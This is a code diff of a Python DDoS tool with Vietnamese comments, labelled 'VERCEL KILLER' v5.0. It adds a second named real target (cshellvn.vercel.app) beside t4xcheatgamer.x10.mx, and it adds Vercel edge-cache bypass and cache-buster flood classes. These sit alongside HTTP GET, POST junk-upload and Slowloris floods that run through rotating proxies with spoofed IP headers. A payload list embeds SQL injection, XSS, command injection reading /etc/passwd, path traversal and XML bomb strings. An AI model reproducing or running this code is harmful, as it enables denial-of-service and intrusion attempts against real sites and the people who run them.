@@ -1,8 +1,8 @@
 # -*- coding: utf-8 -*-
-# TOOL DDoS SIÊU MẠNH - ĐA METHOD - ĐA MỤC TIÊU - CHỐNG TREO - TỰ LƯU CTRL+C
-# Mục tiêu: t4xcheatgamer.x10.mx (3 URL)
+# TOOL DDoS SIÊU MẠNH - ĐA METHOD - ĐA MỤC TIÊU - HỖ TRỢ VERCEL
+# Mục tiêu: t4xcheatgamer.x10.mx + cshellvn.vercel.app
 # Tác giả: palofsc
-# Phiên bản: 4.0 ULTRA
+# Phiên bản: 5.0 VERCEL KILLER
 
 import requests
 import threading
@@ -19,6 +19,9 @@ import urllib3
 import string
 import hashlib
 import json
+import base64
+import gzip
+import zlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, urlencode
 import warnings
@@ -28,49 +31,43 @@ urllib3.disable_warnings()
 # ============================================
 # CẤU HÌNH CHUNG
 # ============================================
-TARGET_HOST = "www.t4xcheatgamer.x10.mx"
+TARGET_HOST_1 = "www.t4xcheatgamer.x10.mx"
+TARGET_HOST_2 = "cshellvn.vercel.app"
 TARGET_PORT = 443
 
-# ĐA MỤC TIÊU
+# ĐA MỤC TIÊU - CẢ 2 DOMAIN
 TARGET_URLS = [
+    # Domain 1: x10.mx
     "https://www.t4xcheatgamer.x10.mx/dll_download.php",
     "https://www.t4xcheatgamer.x10.mx/login.php",
     "https://www.t4xcheatgamer.x10.mx/dll_status.php",
+    # Domain 2: vercel.app
+    "https://cshellvn.vercel.app/getkey",
+    "https://cshellvn.vercel.app/index.html",
+    "https://cshellvn.vercel.app/download",
+    "https://cshellvn.vercel.app/api/",
+    "https://cshellvn.vercel.app/_next/",
+    "https://cshellvn.vercel.app/static/",
+    "https://cshellvn.vercel.app/favicon.ico",
+    "https://cshellvn.vercel.app/robots.txt",
+    "https://cshellvn.vercel.app/sitemap.xml",
 ]
 
 TARGET_PATHS = [
-    "/dll_download.php",
-    "/login.php",
-    "/dll_status.php",
-    "/index.php",
-    "/download.php",
-    "/files/",
-    "/wp-admin/",
-    "/admin/",
-    "/wp-login.php",
-    "/api/",
-    "/upload.php",
-    "/config.php",
-    "/backup/",
-    "/wp-content/",
-    "/wp-includes/",
-    "/xmlrpc.php",
-    "/wp-json/",
-    "/.env",
-    "/.git/config",
-    "/phpinfo.php",
-    "/info.php",
-    "/test.php",
-    "/status.php",
-    "/server-status",
-    "/server-info",
+    "/dll_download.php", "/login.php", "/dll_status.php",
+    "/getkey", "/index.html", "/download",
+    "/api/", "/_next/", "/static/", "/favicon.ico", "/robots.txt", "/sitemap.xml",
+    "/api/auth", "/api/user", "/api/data", "/api/config",
+    "/wp-admin/", "/admin/", "/wp-login.php", "/xmlrpc.php",
+    "/.env", "/.git/config", "/phpinfo.php", "/info.php", "/test.php",
+    "/status.php", "/server-status", "/server-info",
+    "/_next/static/", "/_next/data/", "/__nextjs_original-stack-frame",
 ]
 
 # File lưu proxy
 PROXY_FILE = "proxies_raw.txt"
 PROXY_LIVE_FILE = "proxies_live.txt"
 
-# Biến toàn cục để xử lý Ctrl+C
 current_proxy_manager = None
 
 # Tham số scan proxy
@@ -110,6 +107,9 @@ HTTP_FLOOD_THREADS = 5000
 SLOWLORIS_THREADS = 1000
 POST_FLOOD_THREADS = 2000
 RANDOM_METHOD_THREADS = 3000
+VERCEL_BYPASS_THREADS = 2000
+CACHE_BYPASS_THREADS = 2000
+TOTAL_THREADS = HTTP_FLOOD_THREADS + SLOWLORIS_THREADS + POST_FLOOD_THREADS + RANDOM_METHOD_THREADS + VERCEL_BYPASS_THREADS + CACHE_BYPASS_THREADS
 DDOS_DELAY = 0
 ROTATE_PROXY_EVERY = 1
 
@@ -124,7 +124,6 @@ HTTP_METHODS = [
     "REPORT", "UPDATE", "REDIRECT", "FOOBAR", "RANDOM123", "NULL", "FAKE",
 ]
 
-# Hàng trăm Content-Type khác nhau
 CONTENT_TYPES = [
     "application/x-www-form-urlencoded",
     "multipart/form-data",
@@ -150,8 +149,6 @@ CONTENT_TYPES = [
     "application/vnd.ms-excel",
     "application/vnd.ms-powerpoint",
     "application/msword",
-    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
-    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
     "application/java-archive",
     "application/x-msdownload",
     "application/x-python-code",
@@ -168,7 +165,6 @@ CONTENT_TYPES = [
     "application/xml; charset=UTF-8",
 ]
 
-# Hàng trăm query string parameters
 QUERY_PARAMS_POOL = [
     "download", "file_id", "id", "action", "mode", "type", "token", "key", "hash",
     "checksum", "version", "user", "pass", "username", "password", "login", "email",
@@ -179,28 +175,26 @@ QUERY_PARAMS_POOL = [
     "cookie", "csrf", "nonce", "timestamp", "time", "date", "rand", "random",
     "s", "p", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
     "n", "o", "r", "t", "u", "v", "w", "x", "y", "z",
+    # Vercel-specific params
+    "__nextDefaultLocale", "__nextLocale", "__nextDataReq", "_rsc", "_next",
+    "buildId", "props", "page", "params",
 ]
 
-# Hàng trăm giá trị payload
 PAYLOADS = [
-    # SQL Injection payloads
     "' OR '1'='1", "' OR 1=1--", "admin'--", "1' OR '1'='1'--",
     "1; DROP TABLE users--", "' UNION SELECT * FROM users--",
     "1 AND 1=1", "1 AND 1=2", "' OR 'x'='x",
-    # XSS payloads
     "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
     "javascript:alert(1)", "<svg/onload=alert(1)>",
-    # Command injection
     "; ls -la", "| cat /etc/passwd", "`id`", "$(whoami)",
-    # Path traversal
     "../../../etc/passwd", "..\\..\\..\\windows\\system32",
-    # Random strings
     ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(50, 500))),
     ''.join(random.choices(string.printable, k=random.randint(100, 1000))),
-    # Null bytes
     "\x00" * random.randint(100, 1000),
-    # XML bomb
     '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>',
+    # Vercel bypass payloads
+    '{"__proto__": {"polluted": true}}',
+    'constructor.prototype.polluted=true',
 ]
 
 USER_AGENTS = [
@@ -224,30 +218,29 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    # Bot user agents
     "Googlebot/2.1 (+http://www.google.com/bot.html)",
     "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
     "Baiduspider/2.0 (+http://www.baidu.com/search/spider.htm)",
     "YandexBot/3.0 (+http://yandex.com/bots)",
     "facebookexternalhit/1.1",
     "Twitterbot/1.0",
-    # Mobile
     "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-    # Old browsers
     "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
     "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
     "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
     "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11",
-    # cURL
     "curl/7.68.0",
     "Wget/1.20.3 (linux-gnu)",
     "python-requests/2.28.0",
+    # Vercel edge bypass user agents
+    "Vercel/1.0 (+https://vercel.com)",
+    "Next.js/14.0.0",
 ]
 
 REFERERS = [
     "https://www.google.com/search?q=cheat+game+download",
-    "https://www.google.com/search?q=t4x+cheat+gamer",
+    "https://www.google.com/search?q=cshell+vercel",
     "https://www.bing.com/search?q=free+game+cheats",
     "https://www.reddit.com/r/cheats/",
     "https://www.youtube.com/watch?v=cheat_tutorial",
@@ -264,8 +257,9 @@ REFERERS = [
     "https://www.baidu.com/s?wd=cheat",
     "https://yandex.ru/search/?text=cheat",
     "https://search.yahoo.com/search?p=cheat",
-    "",
+    "https://cshellvn.vercel.app/",
     "https://www.t4xcheatgamer.x10.mx/",
+    "",
 ]
 
 # ============================================
@@ -348,7 +342,6 @@ class ProxyManager:
         current_proxy_manager = self
         print("\n" + "="*60)
         print(f"[*] BẮT ĐẦU KIỂM TRA {len(proxy_list)} PROXY...")
-        print(f"[*] Timeout: {PROXY_CHECK_TIMEOUT}s | Luồng: {PROXY_CHECK_THREADS} | Tự động lưu mỗi: {SAVE_INTERVAL} proxy")
         print("="*60 + "\n")
         live_proxies = []
         self.total_scanned = len(proxy_list)
@@ -371,7 +364,7 @@ class ProxyManager:
                     with open(PROXY_LIVE_FILE, "w") as f:
                         for p in live_proxies:
                             f.write(p + "\n")
-                    print(f"\n[!] Đã tự động lưu {len(live_proxies)} proxy vào {PROXY_LIVE_FILE} (checkpoint tại {checked}/{self.total_scanned})")
+                    print(f"\n[!] Đã tự động lưu {len(live_proxies)} proxy vào {PROXY_LIVE_FILE}")
         with open(PROXY_LIVE_FILE, "w") as f:
             for proxy in live_proxies:
                 f.write(proxy + "\n")
@@ -406,12 +399,9 @@ class UltraDDoSAttack:
         self.running = False
         
     def generate_random_url(self):
-        """Tạo URL ngẫu nhiên từ danh sách mục tiêu"""
         base_url = random.choice(TARGET_URLS)
-        # Thêm path ngẫu nhiên
         if random.random() < 0.3:
-            base_url = f"https://{TARGET_HOST}{random.choice(TARGET_PATHS)}"
-        # Thêm query params ngẫu nhiên
+            base_url = f"https://{random.choice([TARGET_HOST_1, TARGET_HOST_2])}{random.choice(TARGET_PATHS)}"
         num_params = random.randint(1, 15)
         params = {}
         for _ in range(num_params):
@@ -420,52 +410,27 @@ class UltraDDoSAttack:
             params[key] = value
         if params:
             base_url += "?" + urlencode(params)
-        # Thêm fragment ngẫu nhiên
         if random.random() < 0.1:
             base_url += "#" + ''.join(random.choices(string.ascii_letters, k=random.randint(5, 50)))
         return base_url
     
     def generate_ultra_headers(self):
-        """Tạo HTTP headers siêu ngẫu nhiên"""
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
-            "Accept": random.choice([
-                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "application/json,text/html,*/*",
-                "text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5",
-                "*/*",
-            ]),
-            "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "zh-CN,zh;q=0.9", "ru-RU,ru;q=0.9", "*"]),
-            "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity", "*"]),
+            "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "application/json,text/html,*/*", "*/*"]),
+            "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "*"]),
+            "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
             "Referer": random.choice(REFERERS),
-            "Connection": random.choice(["keep-alive", "close", "Keep-Alive"]),
-            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "must-revalidate"]),
-            "Pragma": random.choice(["no-cache", "no-cache"]),
+            "Connection": random.choice(["keep-alive", "close"]),
+            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
             "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
             "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
             "X-Client-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
-            "X-Originating-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
-            "X-Remote-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
-            "X-Forwarded-Host": random.choice([TARGET_HOST, "google.com", "localhost", "127.0.0.1"]),
-            "X-Forwarded-Proto": random.choice(["http", "https"]),
-            "X-Host": TARGET_HOST,
-            "X-Forwarded-Server": random.choice([TARGET_HOST, "apache", "nginx"]),
             "Content-Type": random.choice(CONTENT_TYPES),
-            "Origin": f"https://{TARGET_HOST}",
-            "DNT": random.choice(["1", "0"]),
-            "Upgrade-Insecure-Requests": random.choice(["1", "0"]),
-            "Sec-Fetch-Dest": random.choice(["document", "empty", "frame", "iframe", "image", "script", "style", "worker"]),
-            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
-            "Sec-Fetch-Site": random.choice(["cross-site", "same-origin", "none"]),
-            "Sec-Fetch-User": random.choice(["?1", "?0"]),
-            "TE": random.choice(["trailers", "compress", "deflate", "gzip"]),
-            "Via": f"{random.randint(1,9)}.{random.randint(0,9)} {random.choice(['nginx', 'apache', 'squid', 'varnish'])}",
-            "X-Requested-With": random.choice(["XMLHttpRequest", "Fetch", "curl"]),
+            "Origin": f"https://{random.choice([TARGET_HOST_1, TARGET_HOST_2])}",
             "X-Request-ID": hashlib.md5(os.urandom(16)).hexdigest(),
-            "X-Correlation-ID": hashlib.sha256(os.urandom(32)).hexdigest(),
             "X-Trace-ID": ''.join(random.choices(string.hexdigits, k=32)),
         }
-        # Thêm header rác ngẫu nhiên
         for _ in range(random.randint(0, 10)):
             key = f"X-Random-{random.randint(1, 99999)}"
             value = os.urandom(random.randint(100, 2000)).hex()
@@ -473,7 +438,6 @@ class UltraDDoSAttack:
         return headers
     
     def generate_random_body(self):
-        """Tạo body request ngẫu nhiên"""
         body_type = random.choice(["urlencoded", "json", "multipart", "xml", "raw", "empty"])
         if body_type == "urlencoded":
             params = {}
@@ -495,41 +459,34 @@ class UltraDDoSAttack:
             parts.append(f"--{boundary}--\r\n")
             return "\r\n".join(parts)
         elif body_type == "raw":
-            return os.urandom(random.randint(1024, 1024*1024*2))  # 1KB - 2MB
+            return os.urandom(random.randint(1024, 1024*1024*2))
         else:
             return None
     
     def send_mega_request(self, thread_id):
-        """Gửi request siêu ngẫu nhiên với method bất kỳ"""
         session = requests.Session()
         request_counter = 0
         while self.running:
             try:
                 if request_counter % ROTATE_PROXY_EVERY == 0:
                     proxy = self.proxy_manager.get_random_proxy()
-                
                 url = self.generate_random_url()
                 method = random.choice(HTTP_METHODS)
                 headers = self.generate_ultra_headers()
                 body = self.generate_random_body()
-                
                 if method in ["GET", "HEAD", "OPTIONS", "DELETE", "TRACE"]:
                     response = session.request(method, url, headers=headers, proxies=proxy, timeout=30, verify=False, stream=True)
                 else:
                     response = session.request(method, url, headers=headers, data=body, proxies=proxy, timeout=30, verify=False, stream=True)
-                
-                # Đọc response để giữ kết nối
                 try:
                     chunk = response.content[:4096]
                 except:
                     pass
-                
                 with self.lock:
                     self.total_requests += 1
                     self.total_success += 1
                     if self.total_requests % 1000 == 0:
-                        print(f"\r[*] ULTRA ATTACK: {self.total_requests} requests | Success: {self.total_success} | Fail: {self.total_fail} | Live Proxies: {len(self.proxy_manager.live_proxies)}", end="")
-                
+                        print(f"\r[*] ULTRA: {self.total_requests} req | Success: {self.total_success} | Fail: {self.total_fail} | Live: {len(self.proxy_manager.live_proxies)}", end="")
                 request_counter += 1
             except:
                 with self.lock:
@@ -539,10 +496,8 @@ class UltraDDoSAttack:
                 continue
     
     def start_mega_attack(self, num_threads=RANDOM_METHOD_THREADS):
-        """Bắt đầu siêu tấn công đa method"""
         self.running = True
-        print(f"\n[*] BẮT ĐẦU SIÊU TẤN CÔNG ĐA METHOD VỚI {num_threads} LUỒNG...")
-        print(f"[*] {len(HTTP_METHODS)} HTTP Methods | {len(CONTENT_TYPES)} Content-Types | {len(PAYLOADS)} Payloads")
+        print(f"\n[*] ULTRA ATTACK: {num_threads} luồng | {len(HTTP_METHODS)} Methods | {len(CONTENT_TYPES)} Content-Types")
         threads = []
         for i in range(num_threads):
             t = threading.Thread(target=self.send_mega_request, args=(i,))
@@ -557,7 +512,7 @@ class UltraDDoSAttack:
         self.running = False
 
 # ============================================
-# LỚP HTTP FLOOD (GET)
+# LỚP HTTP FLOOD
 # ============================================
 class HTTPFlood:
     def __init__(self, proxy_manager):
@@ -572,15 +527,10 @@ class HTTPFlood:
         file_id = random.randint(1, 9999999)
         params = [
             f"?download=true&file_id={file_id}",
-            f"?download=true&file_id={file_id}&version={random.randint(1, 100)}",
-            f"?download=true&file_id={file_id}&token={random.randint(100000, 999999)}",
-            f"?dl=1&id={file_id}&key={random.randint(100000, 999999)}",
+            f"?id={file_id}&key={random.randint(100000, 999999)}",
             f"?action=download&file={file_id}",
-            f"?get_file={file_id}&type=dll",
             f"?f={file_id}&mode=direct",
             f"?download={file_id}&checksum={random.randint(100000, 999999)}",
-            f"?file={file_id}.dll&force_download=1",
-            f"?id={file_id}&hash={random.randint(100000, 999999)}&d=1",
         ]
         return random.choice(params)
     
@@ -588,20 +538,12 @@ class HTTPFlood:
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-            "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9"]),
+            "Accept-Language": random.choice(["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8"]),
             "Accept-Encoding": "gzip, deflate, br",
             "Referer": random.choice(REFERERS),
             "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "cross-site",
-            "Sec-Fetch-User": "?1",
-            "Cache-Control": "no-cache",
-            "Pragma": "no-cache",
             "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
             "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
-            "X-Client-IP": f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
         }
         return headers
     
@@ -621,7 +563,7 @@ class HTTPFlood:
                     self.request_count += 1
                     self.success_count += 1
                     if self.request_count % 1000 == 0:
-                        print(f"\r[*] HTTP GET Flood: {self.request_count} requests | Success: {self.success_count} | Fail: {self.fail_count} | Live Proxies: {len(self.proxy_manager.live_proxies)}", end="")
+                        print(f"\r[*] HTTP GET: {self.request_count} req | Success: {self.success_count} | Fail: {self.fail_count}", end="")
                 request_counter += 1
             except:
                 with self.lock:
@@ -631,7 +573,7 @@ class HTTPFlood:
     
     def start_flood(self, num_threads=HTTP_FLOOD_THREADS):
         self.running = True
-        print(f"\n[*] BẮT ĐẦU HTTP GET FLOOD VỚI {num_threads} LUỒNG...")
+        print(f"\n[*] HTTP GET FLOOD: {num_threads} luồng...")
         threads = []
         for i in range(num_threads):
             t = threading.Thread(target=self.send_request, args=(i,))
@@ -646,7 +588,7 @@ class HTTPFlood:
         self.running = False
 
 # ============================================
-# LỚP POST FLOOD (UPLOAD FILE RÁC)
+# LỚP POST FLOOD
 # ============================================
 class PostFlood:
     def __init__(self, proxy_manager):
@@ -660,24 +602,23 @@ class PostFlood:
             try:
                 proxy = self.proxy_manager.get_random_proxy()
                 target = random.choice(TARGET_URLS)
-                # Tạo file rác 500KB - 2MB
-                fake_file = os.urandom(random.randint(1024*500, 1024*1024*2))
-                files = {"file": (f"cheat_{random.randint(1,99999)}.dll", fake_file, "application/x-msdownload")}
+                fake_file = os.urandom(random.randint(1024*500, 1024*1024*5))
+                files = {"file": (f"file_{random.randint(1,99999)}.dat", fake_file, "application/octet-stream")}
                 data = {}
                 for _ in range(random.randint(1, 10)):
                     data[random.choice(QUERY_PARAMS_POOL)] = random.choice(PAYLOADS)
                 headers = {"User-Agent": random.choice(USER_AGENTS), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"}
-                response = requests.post(target, files=files, data=data, headers=headers, proxies=proxy, timeout=30, verify=False)
+                response = requests.post(target, files=files, data=data, headers=headers, proxies=proxy, timeout=60, verify=False)
                 with self.lock:
                     self.request_count += 1
                     if self.request_count % 500 == 0:
-                        print(f"\r[*] POST Flood: {self.request_count} uploads | Live Proxies: {len(self.proxy_manager.live_proxies)}", end="")
+                        print(f"\r[*] POST Flood: {self.request_count} uploads | Live: {len(self.proxy_manager.live_proxies)}", end="")
             except:
                 pass
     
     def start_flood(self, num_threads=POST_FLOOD_THREADS):
         self.running = True
-        print(f"\n[*] BẮT ĐẦU POST FLOOD (UPLOAD FILE RÁC) VỚI {num_threads} LUỒNG...")
+        print(f"\n[*] POST FLOOD (UPLOAD FILE RÁC): {num_threads} luồng...")
         threads = []
         for i in range(num_threads):
             t = threading.Thread(target=self.send_post_flood, args=(i,))
@@ -692,6 +633,159 @@ class PostFlood:
         self.running = False
 
 # ============================================
+# LỚP VERCEL BYPASS - ĐÁNH VÀO EDGE CACHE
+# ============================================
+class VercelBypass:
+    """Tấn công đặc biệt vào Vercel - bypass edge cache"""
+    def __init__(self, proxy_manager):
+        self.proxy_manager = proxy_manager
+        self.request_count = 0
+        self.lock = threading.Lock()
+        self.running = False
+    
+    def send_vercel_bypass(self, thread_id):
+        """Gửi request với cache-busting để bỏ qua Vercel Edge Cache"""
+        while self.running:
+            try:
+                proxy = self.proxy_manager.get_random_proxy()
+                # Chọn target Vercel
+                targets = [u for u in TARGET_URLS if "vercel.app" in u]
+                if not targets:
+                    targets = TARGET_URLS
+                target = random.choice(targets)
+                
+                # Tạo URL với cache buster ngẫu nhiên
+                cache_buster = f"?_vercel_no_cache={random.randint(100000000, 999999999)}"
+                cache_buster += f"&_rsc={random.choice(['1', '0', 'true', 'false'])}"
+                cache_buster += f"&_next={random.randint(100000, 999999)}"
+                cache_buster += f"&buildId={hashlib.md5(os.urandom(16)).hexdigest()}"
+                cache_buster += f"&{random.choice(QUERY_PARAMS_POOL)}={random.choice(PAYLOADS)}"
+                
+                url = target + cache_buster
+                
+                headers = {
+                    "User-Agent": random.choice(USER_AGENTS),
+                    "Accept": "text/x-component",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Referer": f"https://{TARGET_HOST_2}/",
+                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                    "X-Forwarded-Host": TARGET_HOST_2,
+                    "X-Vercel-Id": hashlib.md5(os.urandom(16)).hexdigest(),
+                    "X-Vercel-Cache": "BYPASS",
+                    "X-Vercel-Skip-Cache": "1",
+                    "Cache-Control": "no-cache, no-store, must-revalidate",
+                    "Pragma": "no-cache",
+                    "CDN-Cache-Control": "no-cache",
+                    "CloudFront-Is-Mobile-Viewer": random.choice(["true", "false"]),
+                    "CloudFront-Is-Desktop-Viewer": random.choice(["true", "false"]),
+                    "CloudFront-Forwarded-Proto": "https",
+                    "CloudFront-Viewer-Country": random.choice(["VN", "US", "SG", "JP", "KR", "CN", "RU", "DE", "FR", "GB"]),
+                    "True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                    "X-Edge-Request-Id": hashlib.sha256(os.urandom(32)).hexdigest(),
+                }
+                
+                # Gửi request với method ngẫu nhiên
+                method = random.choice(["GET", "POST", "HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
+                if method in ["POST", "PUT", "PATCH"]:
+                    body = os.urandom(random.randint(1024, 1024*100))
+                    response = requests.request(method, url, headers=headers, data=body, proxies=proxy, timeout=30, verify=False)
+                else:
+                    response = requests.request(method, url, headers=headers, proxies=proxy, timeout=30, verify=False, stream=True)
+                    try:
+                        chunk = response.content[:4096]
+                    except:
+                        pass
+                
+                with self.lock:
+                    self.request_count += 1
+                    if self.request_count % 500 == 0:
+                        print(f"\r[*] VERCEL BYPASS: {self.request_count} req | Live: {len(self.proxy_manager.live_proxies)}", end="")
+            except:
+                pass
+    
+    def start_attack(self, num_threads=VERCEL_BYPASS_THREADS):
+        self.running = True
+        print(f"\n[*] VERCEL BYPASS ATTACK: {num_threads} luồng (bỏ qua Edge Cache)...")
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(target=self.send_vercel_bypass, args=(i,))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+            if i % 200 == 0:
+                time.sleep(0.01)
+        return threads
+    
+    def stop_attack(self):
+        self.running = False
+
+# ============================================
+# LỚP CACHE BUSTER - TẤN CÔNG VÀO CACHE SERVER
+# ============================================
+class CacheBuster:
+    """Tấn công tạo hàng triệu URL duy nhất để phá cache"""
+    def __init__(self, proxy_manager):
+        self.proxy_manager = proxy_manager
+        self.request_count = 0
+        self.lock = threading.Lock()
+        self.running = False
+    
+    def send_cache_buster(self, thread_id):
+        while self.running:
+            try:
+                proxy = self.proxy_manager.get_random_proxy()
+                target = random.choice(TARGET_URLS)
+                
+                # Tạo URL duy nhất với hàng loạt tham số ngẫu nhiên
+                unique_params = []
+                for _ in range(random.randint(5, 30)):
+                    param_name = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 15)))
+                    param_value = hashlib.md5(os.urandom(16)).hexdigest()
+                    unique_params.append(f"{param_name}={param_value}")
+                
+                url = target + "?" + "&".join(unique_params)
+                
+                headers = {
+                    "User-Agent": random.choice(USER_AGENTS),
+                    "Accept": "*/*",
+                    "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
+                    "Pragma": "no-cache",
+                    "Expires": "0",
+                    "Surrogate-Control": "no-store",
+                    "CDN-Cache-Control": "no-cache",
+                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
+                }
+                
+                response = requests.get(url, headers=headers, proxies=proxy, timeout=30, verify=False, stream=True)
+                try:
+                    chunk = response.content[:4096]
+                except:
+                    pass
+                
+                with self.lock:
+                    self.request_count += 1
+                    if self.request_count % 500 == 0:
+                        print(f"\r[*] CACHE BUSTER: {self.request_count} unique URLs | Live: {len(self.proxy_manager.live_proxies)}", end="")
+            except:
+                pass
+    
+    def start_attack(self, num_threads=CACHE_BYPASS_THREADS):
+        self.running = True
+        print(f"\n[*] CACHE BUSTER ATTACK: {num_threads} luồng (phá hủy cache)...")
+        threads = []
+        for i in range(num_threads):
+            t = threading.Thread(target=self.send_cache_buster, args=(i,))
+            t.daemon = True
+            t.start()
+            threads.append(t)
+            if i % 200 == 0:
+                time.sleep(0.01)
+        return threads
+    
+    def stop_attack(self):
+        self.running = False
+
+# ============================================
 # LỚP SLOWLORIS
 # ============================================
 class Slowloris:
@@ -699,7 +793,7 @@ class Slowloris:
         self.sockets = []
         self.running = False
         
-    def create_socket(self, target_host=TARGET_HOST, target_path=None):
+    def create_socket(self, target_host=TARGET_HOST_1, target_path=None):
         if target_path is None:
             target_path = random.choice(TARGET_PATHS)
         try:
@@ -713,20 +807,20 @@ class Slowloris:
             request = f"GET {target_path} HTTP/1.1\r\n"
             request += f"Host: {target_host}\r\n"
             request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-            request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+            request += f"Accept: */*\r\n"
             request += f"Accept-Language: en-US,en;q=0.5\r\n"
             request += f"Accept-Encoding: gzip, deflate, br\r\n"
             request += f"Connection: keep-alive\r\n"
-            request += f"X-Random-{random.randint(1,9999)}: {os.urandom(random.randint(500,2000)).hex()}\r\n"
             ssl_sock.send(request.encode())
             return ssl_sock
         except:
             return None
     
     def maintain_sockets(self, thread_id):
+        host = random.choice([TARGET_HOST_1, TARGET_HOST_2])
         sockets = []
         for i in range(50):
-            sock = self.create_socket()
+            sock = self.create_socket(target_host=host)
             if sock:
                 sockets.append(sock)
         self.sockets.extend(sockets)
@@ -743,14 +837,14 @@ class Slowloris:
                         sock.close()
                     except:
                         pass
-                    new_sock = self.create_socket()
+                    new_sock = self.create_socket(target_host=host)
                     if new_sock:
                         sockets[i] = new_sock
                     time.sleep(1)
     
     def start_attack(self, num_threads=SLOWLORIS_THREADS):
         self.running = True
-        print(f"\n[*] BẮT ĐẦU SLOWLORIS VỚI {num_threads} LUỒNG...")
+        print(f"\n[*] SLOWLORIS: {num_threads} luồng...")
         threads = []
         for i in range(num_threads):
             t = threading.Thread(target=self.maintain_sockets, args=(i,))
@@ -773,25 +867,26 @@ class Slowloris:
 # HÀM CHÍNH
 # ============================================
 def print_banner():
-    banner = """
-    ╔══════════════════════════════════════════════════════════════╗
-    ║  ██╗   ██╗██╗  ████████╗██████╗  █████╗     ██████╗ ██████╗  ██████╗ ███████╗ ║
-    ║  ██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝ ║
-    ║  ██║   ██║██║     ██║   ██████╔╝███████║    ██║  ██║██║  ██║██║   ██║███████╗ ║
